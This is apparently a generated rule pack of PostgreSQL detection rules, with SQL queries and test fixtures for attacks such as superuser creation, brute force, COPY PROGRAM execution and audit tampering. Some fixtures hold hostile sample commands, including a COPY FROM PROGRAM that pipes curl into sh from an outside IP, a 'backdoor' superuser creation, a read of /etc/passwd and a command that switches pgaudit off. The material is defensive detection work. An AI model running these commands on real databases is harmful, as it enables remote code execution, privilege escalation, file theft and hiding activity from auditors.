# Generated by scripts/gen_rule_packs.py - edit there, then re-run it.
pack_id: postgres
name: PostgreSQL
vendor: PostgreSQL
version: 1
description: "pgaudit and authentication detections: superuser grants, brute force, COPY ... PROGRAM command execution, bulk exports, audit tampering, dangerous extensions, mass destruction, server file access and new client hosts."
requires: [{"table": "DATABASE_ACTIVITY", "vendor_product": "postgres"}]
onboarding: "Enable pgaudit (pgaudit.log = 'ddl, role, write, misc') and log_destination = 'jsonlog', then tail the jsonlog with otel-receiver/collector-examples/postgres.yaml (filelog receiver), service.name postgres."
rules:
  - id: PG-001
    name: "Superuser role created or granted"
    description: "CREATE/ALTER ROLE ... SUPERUSER, or membership in pg_execute_server_program / rds_superuser."
    severity: 5
    tactic: "TA0004"
    technique: "T1098"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,ROLE,CREATE ROLE,,,CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x',<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,ROLE,CREATE ROLE,,,CREATE ROLE reporting NOSUPERUSER LOGIN,<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Superuser change by ' || user_name || ': ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (result = 'success' AND query_type IN ('CREATE ROLE', 'ALTER ROLE', 'GRANT') AND REGEXP_LIKE(query_text, '.*([[:space:]]SUPERUSER|pg_execute_server_program|pg_write_server_files|rds_superuser|azure_pg_admin).*', 'is'))

  - id: PG-002
    name: "PostgreSQL password brute force"
    description: "Ten or more password failures (28P01) for one user from one host in 10 minutes."
    severity: 4
    tactic: "TA0006"
    technique: "T1110"
    table: "DATABASE_ACTIVITY"
    threshold: 10
    window_minutes: 10
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.9:5000", "error_severity": "FATAL", "state_code": "28P01", "message": "password authentication failed for user \"{{entity}}\""}}, "count": 10, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.9:5000", "error_severity": "FATAL", "state_code": "28P01", "message": "password authentication failed for user \"{{entity}}\""}}, "count": 3, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Auth failed: ' || COALESCE(reason, '') AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (action = 'login' AND result = 'failure')

  - id: PG-003
    name: "COPY ... PROGRAM (command execution)"
    description: "COPY TO/FROM PROGRAM runs OS commands as the postgres user."
    severity: 5
    tactic: "TA0002"
    technique: "T1059"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,WRITE,COPY,,,COPY t FROM PROGRAM 'curl -s http://203.0.113.9/x | sh',<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,WRITE,COPY,,,COPY t FROM STDIN,<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'COPY PROGRAM: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (REGEXP_LIKE(query_text, '.*COPY[[:space:]].*(TO|FROM)[[:space:]]+PROGRAM.*', 'is'))

  - id: PG-004
    name: "Table exported with COPY TO"
    description: "COPY ... TO a file or STDOUT: bulk export of a table."
    severity: 3
    tactic: "TA0009"
    technique: "T1005"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    false_positives: "Backups and ETL using COPY (filter their users)."
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,READ,COPY,TABLE,public.customers,COPY customers TO STDOUT WITH CSV HEADER,<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,WRITE,COPY,TABLE,public.staging,COPY staging FROM STDIN,<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Export: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (result = 'success' AND query_type = 'COPY' AND REGEXP_LIKE(query_text, '.*[[:space:]]TO[[:space:]]+(STDOUT|.[/]).*', 'is'))

  - id: PG-005
    name: "Audit logging tampered with"
    description: "pgaudit dropped or logging settings reduced."
    severity: 5
    tactic: "TA0005"
    technique: "T1562.001"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,MISC,ALTER SYSTEM,,,ALTER SYSTEM SET pgaudit.log = 'none',<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,MISC,ALTER SYSTEM,,,ALTER SYSTEM SET work_mem = '64MB',<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Audit tampering: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (REGEXP_LIKE(query_text, '.*(DROP[[:space:]]+EXTENSION[[:space:]]+(IF[[:space:]]+EXISTS[[:space:]]+)?pgaudit|pgaudit[.]log[[:space:]]*(=|TO)[[:space:]]*.none|log_statement[[:space:]]*(=|TO)[[:space:]]*.none|SET[[:space:]]+pgaudit[.]log).*', 'is'))

  - id: PG-006
    name: "Dangerous extension created"
    description: "Untrusted languages and file/remote-access extensions enable code execution or data movement."
    severity: 4
    tactic: "TA0003"
    technique: "T1505"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,DDL,CREATE EXTENSION,,,CREATE EXTENSION plpython3u,<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,DDL,CREATE EXTENSION,,,CREATE EXTENSION pg_trgm,<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Extension: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (result = 'success' AND query_type = 'CREATE EXTENSION' AND REGEXP_LIKE(query_text, '.*(plpython3?u|plperlu|pltclu|dblink|adminpack|file_fdw|postgres_fdw|lo_|plsh).*', 'is'))

  - id: PG-007
    name: "Mass table destruction"
    description: "Five or more DROP TABLE / TRUNCATE statements by one user in 10 minutes."
    severity: 4
    tactic: "TA0040"
    technique: "T1485"
    table: "DATABASE_ACTIVITY"
    threshold: 5
    window_minutes: 10
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,DDL,DROP TABLE,TABLE,public.orders_{{n}},DROP TABLE orders_{{n}},<not logged>"}}, "count": 6, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,DDL,DROP TABLE,TABLE,public.tmp_{{n}},DROP TABLE tmp_{{n}},<not logged>"}}, "count": 2, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, query_type || ' ' || COALESCE(object, '') AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (result = 'success' AND query_type IN ('DROP TABLE', 'TRUNCATE TABLE', 'DROP SCHEMA', 'DROP DATABASE'))

  - id: PG-008
    name: "Server file access functions"
    description: "pg_read_file, pg_ls_dir, lo_import/lo_export read or write files on the database server."
    severity: 4
    tactic: "TA0007"
    technique: "T1083"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,READ,SELECT,,,SELECT pg_read_file('/etc/passwd'),<not logged>"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"timestamp": null, "user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.5:51234", "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1", "message": "AUDIT: SESSION,1,1,READ,SELECT,,,SELECT count(*) FROM orders,<not logged>"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Server file access: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'postgres' AND (REGEXP_LIKE(query_text, '.*(pg_read_file|pg_read_binary_file|pg_ls_dir|lo_import|lo_export|pg_stat_file)[[:space:]]*[(].*', 'is'))

  - id: PG-009
    name: "Login from a new client host"
    description: "Successful connection from a host the user has not connected from in 30 days."
    severity: 2
    tactic: "TA0001"
    technique: "T1078"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.9:5000", "error_severity": "LOG", "state_code": "00000", "message": "connection authorized: user={{entity}} database=prod"}}, "count": 1, "offset_minutes": 7200}, {"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "203.0.113.77:5000", "error_severity": "LOG", "state_code": "00000", "message": "connection authorized: user={{entity}} database=prod"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.9:5000", "error_severity": "LOG", "state_code": "00000", "message": "connection authorized: user={{entity}} database=prod"}}, "count": 1, "offset_minutes": 7200}, {"otel": {"service_name": "postgres", "body": {"user": "{{entity}}", "dbname": "prod", "remote_host": "10.20.0.9:5000", "error_severity": "LOG", "state_code": "00000", "message": "connection authorized: user={{entity}} database=prod"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT n._time, n.user_name, n.src, n.dest, 'First connection from ' || n.src AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY n
      WHERE n.vendor_product = 'postgres' AND n.action = 'login' AND n.result = 'success'
        AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())
        AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'postgres'
                    AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name
                    AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('day', -1, n._time))
        AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'postgres'
                    AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name AND h.src = n.src
                    AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('minute', -240, CURRENT_TIMESTAMP()))

